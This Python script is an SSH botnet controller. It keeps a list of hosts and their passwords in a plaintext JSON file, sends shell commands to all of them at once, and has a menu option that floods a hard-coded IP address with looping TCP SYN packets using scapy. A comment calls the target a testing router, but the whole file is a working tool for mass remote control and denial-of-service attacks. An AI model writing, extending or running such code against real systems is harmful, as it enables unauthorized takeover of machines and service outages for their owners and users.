import sys
import os
import json
from colorama import Fore, init
from pexpect import pxssh
from scapy.all import *

init(autoreset=True)

os.system('clear')

# Function to display menu
def display_menu():
    print(Fore.GREEN + "1. List Bots")
    print(Fore.GREEN + "2. Run Command")
    print(Fore.GREEN + "3. Bash")
    print(Fore.GREEN + "4. Add Bot")
    print(Fore.GREEN + "5. DDOS")
    print(Fore.RED + "6. Exit")

# Connect to SSH server
def connect_ssh(host, port, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password, port=port)
        return s
    except Exception as e:
        print(Fore.RED + f"[!] Error connecting to {host}")
        print(e)
        return None

# Sending a command to execute
def send_command(session, cmd):
    session.sendline(cmd)
    session.prompt()
    return session.before

# Running through the loop to traverse the complete clients
def botnet_command(command):
    for client in botnet:
        if 'session' in client:
            session = client['session']
            output = send_command(session, command)
            print(f"[+] Output from " + client['host'])
            print("<<< " + output.decode())
        else:
            print(Fore.RED + f"[!] Error: No session found for {client['host']}")

# Adding new clients to botnet
def add_client(host, port, user, password):
    session = connect_ssh(host, port, user, password)
    if session:
        client_info = {'host': host, 'port': port, 'user': user, 'password': password, 'session': session}
        botnet.append(client_info)
        print(Fore.GREEN + "[+] Bot added successfully.")
    else:
        print(Fore.RED + "[!] Failed to add bot. The bot will not be added to the botnet list.")

# Input command to run
def ask_for_command():
    while True:
        if not botnet:
            print(Fore.RED + "[!] Error: No bots available.")
            break
        run = input(Fore.GREEN + "Enter a command to run (or type 'exit' to return to menu): ")
        if run.lower() == 'exit':
            break
        botnet_command(run)

# Input command to run in bash
def bash():
    while True:
        if not botnet:
            print(Fore.RED + "[!] Error: No bots available.")
            break
        bash_command = input(">>> ")
        for client in botnet:
            if 'session' in client:
                session = client['session']
                output = send_command(session, f"echo {bash_command} | /bin/bash")
                print(f"[+] Output from " + client['host'])
                print("<<< " + output.decode())
            else:
                print(Fore.RED + f"[!] Error: No session found for {client['host']}")
        if bash_command.lower() == 'exit':
            break

# Command for all
def command_for_all():
    target_IP = "192.168.10.140"  # the target IP address (should be a testing router/firewall)
    target_port = 80  # the target port you want to flood
    ip = IP(dst=target_IP)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * 1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=1)

# Save botnet to a file
def save_botnet():
    botnet_data = [{'host': client['host'], 'port': client['port'], 'user': client['user'], 'password': client['password']} for client in botnet]
    with open('botnet.json', 'w') as f:
        json.dump(botnet_data, f)

# Load botnet from a file
def load_botnet():
    global botnet
    botnet = []  # Clear the current botnet list
    try:
        with open('botnet.json', 'r') as f:
            botnet_data = json.load(f)
        # Reconnect sessions for each bot
        for client_data in botnet_data:
            session = connect_ssh(client_data['host'], client_data['port'], client_data['user'], client_data['password'])
            if session:
                client_data['session'] = session
                botnet.append(client_data)
                print(Fore.GREEN + f"[+] Reconnected to bot {client_data['host']}")
            else:
                print(Fore.RED + f"[!] Failed to reconnect to bot {client_data['host']}.")
    except FileNotFoundError:
        botnet = []

# Main loop
botnet = []
load_botnet()  # Load the botnet at the start

while True:
    print("")
    display_menu()
    option = input(Fore.YELLOW + "Enter any option: ")
    if option == '1':
        if botnet:
            for client in botnet:
                print(Fore.CYAN + str(client))
        else:
            print(Fore.RED + "Botnet is empty.")
    elif option == '2':
        ask_for_command()
    elif option == '3':
        bash()
    elif option == '4':
        host = input("Enter the bot's IP address: ")
        port = input("Enter the bot's SSH port number: ")
        user = input("Enter the bot's username: ")
        password = input("Enter the bot's password: ")
        add_client(host, port, user, password)
        save_botnet()  # Save botnet after adding a client
    elif option == '5':
        command_for_all()
    elif option == '6':
        save_botnet()  # Save botnet before exiting
        sys.exit()
    else:
        print("Invalid option. Please choose a valid option.")
